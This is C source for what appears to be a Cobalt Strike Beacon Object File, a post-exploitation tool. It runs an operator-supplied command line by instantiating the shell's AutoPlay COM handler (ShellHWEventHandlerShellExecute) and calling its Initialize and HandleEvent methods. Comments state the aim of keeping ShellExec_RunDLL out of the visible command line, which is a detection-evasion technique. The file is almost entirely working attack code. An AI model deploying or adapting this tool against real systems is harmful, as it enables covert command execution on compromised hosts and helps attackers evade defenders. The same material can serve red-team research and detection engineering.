#include <windows.h>
#include "beacon.h"

#ifdef _MSC_VER
DECLSPEC_IMPORT int     __stdcall KERNEL32$MultiByteToWideChar( UINT, DWORD, LPCCH, int, LPWSTR, int );
DECLSPEC_IMPORT LPWSTR  __stdcall KERNEL32$lstrcpynW( LPWSTR, LPCWSTR, int );
DECLSPEC_IMPORT HRESULT __stdcall OLE32$CoInitializeEx( LPVOID, DWORD );
DECLSPEC_IMPORT void    __stdcall OLE32$CoUninitialize( void );
DECLSPEC_IMPORT HRESULT __stdcall OLE32$CoCreateInstance( REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID * );
#else
DFR( KERNEL32, MultiByteToWideChar );
DFR( KERNEL32, lstrcpynW );
DFR( OLE32,    CoInitializeEx );
DFR( OLE32,    CoUninitialize );
DFR( OLE32,    CoCreateInstance );
#endif

// the autoplay interface we need
// only these three slots matter after iunknown
typedef struct IHWEventHandler IHWEventHandler;

typedef struct IHWEventHandlerVtbl {
    HRESULT ( STDMETHODCALLTYPE *QueryInterface        )( IHWEventHandler *This, REFIID riid, void **ppv );
    ULONG   ( STDMETHODCALLTYPE *AddRef                )( IHWEventHandler *This );
    ULONG   ( STDMETHODCALLTYPE *Release               )( IHWEventHandler *This );
    HRESULT ( STDMETHODCALLTYPE *Initialize            )( IHWEventHandler *This, LPCWSTR pszParams );
    HRESULT ( STDMETHODCALLTYPE *HandleEvent           )( IHWEventHandler *This, LPCWSTR pszDeviceID, LPCWSTR pszAltDeviceID, LPCWSTR pszEventType );
    HRESULT ( STDMETHODCALLTYPE *HandleEventWithContent )( IHWEventHandler *This, LPCWSTR pszDeviceID, LPCWSTR pszAltDeviceID, LPCWSTR pszEventType, LPCWSTR pszContentTypeHandler, void *pdataobject );
} IHWEventHandlerVtbl;

struct IHWEventHandler {
    IHWEventHandlerVtbl *lpVtbl;
};

// shell shipped handler that does the shellexecute part for autoplay
static const GUID CLSID_ShellHWEventHandlerShellExecute = { 0xFFB8655F, 0x81B9, 0x4fce, { 0xB8, 0x9C, 0x9A, 0x6B, 0xA7, 0x6D, 0x13, 0xE7 } };

// documented autoplay event handler interface
static const GUID IID_IHWEventHandler = { 0xC1FB73D0, 0xEC3A, 0x4BA2, { 0xB5, 0x12, 0x8C, 0xDB, 0x91, 0x87, 0xB6, 0xD1 } };

void go( char *args, int alen ) {
    datap parser;
    char *cmd_a, *event_a, *device_a;
    WCHAR  cmd_w[2048];
    WCHAR  event_w[256];
    WCHAR  device_w[256];
    IHWEventHandler *handler;
    HRESULT hr_com, hr_init, hr_event;
    int coinit;

    if ( !args || alen <= 0 ) {
        BeaconPrintf( CALLBACK_ERROR, "[x] ShellHWEventExec\n\tmissing\tcmdline\n\tusage\tautoplay_hwevent \"<cmdline>\" [event] [device]\n" );
        return;
    }

    // pull operator args from the cna
    BeaconDataParse( &parser, args, alen );
    cmd_a    = BeaconDataExtract( &parser, NULL );
    event_a  = BeaconDataExtract( &parser, NULL );
    device_a = BeaconDataExtract( &parser, NULL );

    if ( !cmd_a || !cmd_a[0] ) {
        BeaconPrintf( CALLBACK_ERROR, "[x] ShellHWEventExec\n\tmissing\tcmdline\n\tusage\tautoplay_hwevent \"<cmdline>\" [event] [device]\n" );
        return;
    }

    // shell wants wide strings because of course it does
    if ( KERNEL32$MultiByteToWideChar( CP_UTF8, 0, cmd_a, -1, cmd_w, 2048 ) <= 0 ) {
        BeaconPrintf( CALLBACK_ERROR, "[x] ShellHWEventExec\n\tconvert\tcmdline to wide string failed\n" );
        return;
    }

    // boring defaults are fine
    KERNEL32$lstrcpynW( event_w,  L"DeviceArrival", 256 );
    KERNEL32$lstrcpynW( device_w, L"BOFDevice",     256 );

    if ( event_a  && event_a[0]  ) KERNEL32$MultiByteToWideChar( CP_UTF8, 0, event_a,  -1, event_w,  256 );
    if ( device_a && device_a[0] ) KERNEL32$MultiByteToWideChar( CP_UTF8, 0, device_a, -1, device_w, 256 );

    handler = NULL;
    coinit  = 0;

    BeaconPrintf( CALLBACK_OUTPUT, "[*] ShellHWEventExec\n" );
    BeaconPrintf( CALLBACK_OUTPUT, "[*] %ls\n\n", cmd_w );

    // apartment com because shell stuff gets weird otherwise
    hr_com = OLE32$CoInitializeEx( NULL, 0x2 );
    if ( hr_com == S_OK || hr_com == S_FALSE )
        coinit = 1;
    else if ( (DWORD)hr_com != 0x80010106UL ) {
        BeaconPrintf( CALLBACK_ERROR, "[x] CoInitializeEx failed (0x%08lx)\n", (DWORD)hr_com );
        return;
    }

    // ask com for the shell autoplay handler
    // no shellexec_rundll on our command line
    hr_init = OLE32$CoCreateInstance(
        &CLSID_ShellHWEventHandlerShellExecute,
        NULL,
        0x4,
        &IID_IHWEventHandler,
        (void **)&handler );

    if ( FAILED( hr_init ) || !handler ) {
        BeaconPrintf( CALLBACK_ERROR, "[x] CoCreateInstance failed (0x%08lx) -- handler not registered?\n", (DWORD)hr_init );
        goto cleanup;
    }

    BeaconPrintf( CALLBACK_OUTPUT, "[+] {FFB8655F-81B9-4fce-B89C-9A6BA76D13E7} acquired via CLSCTX_LOCAL_SERVER\n" );
    BeaconPrintf( CALLBACK_OUTPUT, "[+] server -> rundll32.exe shell32.dll,SHCreateLocalServerRunDll\n" );

    // initialize gets our cmdline then handleevent makes shell do the thing
    hr_init  = handler->lpVtbl->Initialize( handler, cmd_w );
    hr_event = handler->lpVtbl->HandleEvent( handler, device_w, L"", event_w );

    if ( SUCCEEDED( hr_init ) && SUCCEEDED( hr_event ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[+] IHWEventHandler::Initialize -> cmdline set\n" );
        BeaconPrintf( CALLBACK_OUTPUT, "[+] IHWEventHandler::HandleEvent -> %ls fired @ %ls\n", event_w, device_w );
        BeaconPrintf( CALLBACK_OUTPUT, "[+] execution via shell32 (no ShellExec_RunDLL in cmdline)\n" );
    }
    else {
        BeaconPrintf( CALLBACK_ERROR, "[x] Initialize  0x%08lx\n",  (DWORD)hr_init );
        BeaconPrintf( CALLBACK_ERROR, "[x] HandleEvent 0x%08lx\n", (DWORD)hr_event );
    }

cleanup:
    // dont leak the com object in beacon
    if ( handler ) handler->lpVtbl->Release( handler );
    if ( coinit  ) OLE32$CoUninitialize();
}
